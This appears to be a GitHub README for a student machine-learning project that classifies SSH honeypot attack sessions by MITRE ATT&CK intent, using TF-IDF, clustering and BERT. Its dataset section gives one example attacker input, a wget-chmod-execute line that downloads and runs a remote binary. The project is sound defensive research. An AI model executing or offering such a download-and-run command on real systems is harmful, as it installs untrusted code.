# 🛡️ SSH Shell Attack Classifier- ML4N Project

##👥 Team

Stefano Liberati - SteLib

Marco Di Bernardo - MarcoDibes

Davide Rotondo - Davide Rotondo

Michele Pio Lasalvia - michelepiolasalvia


## 📖 Project Description

This repository contains the code and analysis for the group project of the **Machine Learning for Networking (ML4N)** course.

The main objective is to analyze malicious **Unix Shell** attack sessions, recorded via honeypots, to automatically identify the attacker's intent. The project ranges from classic Machine Learning techniques to the use of **Large Language Models (BERT)** and Deep Learning for threat classification and clustering.

---

## 📂 Analysis Structure

The project is divided into four main sections, following the assignment structure:

### 1. Data Exploration & Pre-processing
Exploratory analysis and preparation of text logs:
* **Temporal Analysis:** Study of attack time series.
* **Feature Engineering:** Analysis of character/word distribution per session.
* **NLP Basics:** Tokenization and identification of the most common commands.
* **Vectorization:** Text conversion via **Bag of Words (BoW)** and **TF-IDF**.

### 2. Supervised Learning - Classification
Multi-label classification of sessions based on **MITRE ATT&CK** tactics (e.g., *Persistence, Impact, Execution*).
* **Models:** Training and evaluation of classic ML algorithms.
* **Evaluation:** Confusion Matrix, Classification Report, and overfitting analysis.
* **Tuning:** Hyperparameter optimization via Cross-Validation.

### 3. Unsupervised Learning - Clustering
Grouping attack sessions to find behavioral patterns without using labels.
* **Algorithms:** K-Means and hierarchical or density-based methods.
* **Semantic Analysis:** Use of **Word Clouds** to interpret cluster content.
* **Validation:** Verification of cluster homogeneity regarding original intents.
* **Fine-grained Analysis:** Identification of specific attack campaigns (e.g., *Mirai, DOTA, Shellshock*) within groups.

### 4. Language Models Exploration (Deep Learning)
Experimentation with advanced language models and Neural Networks.
* **Approach:** Use of Embeddings and Transfer Learning.
* **Models:** **BERT** (Pre-trained Transformer).
* **Fine-Tuning:** Adaptation of the last dense layer of the neural network for the supervised intent classification task.

---

## 📊 The Dataset

The dataset includes approximately **230,000 unique Unix shell attacks** recorded after SSH login on a honeypot deployment.
The labels follow the [MITRE ATT&CK](https://attack.mitre.org/) framework.

* **Source:** [Zenodo Record](https://zenodo.org/records/3687527#.YmEr9pJBxQL)
* **Input:** Shell commands (e.g., `wget http://1.1.1.1/exec; chmod 777 exec; ./exec`)
* **Target:** Attacker Intents (Multi-label).

---

## 🛠️ Technologies Used

* **Language:** Python 3.x
* **Data Science:** `pandas`, `numpy`, `scikit-learn`
* **NLP & Deep Learning:** `nltk`, `transformers` (Hugging Face - BERT), `torch` (PyTorch) or `tensorflow`
* **Visualization:** `matplotlib`, `seaborn`, `wordcloud`
  
---

## 🚀 How to Run

1. **Clone the repository:**
   ```bash
   git clone [https://github.com/SteLib/ML-ssh-session-classifier.git](https://github.com/SteLib/ML-ssh-session-classifier.git)

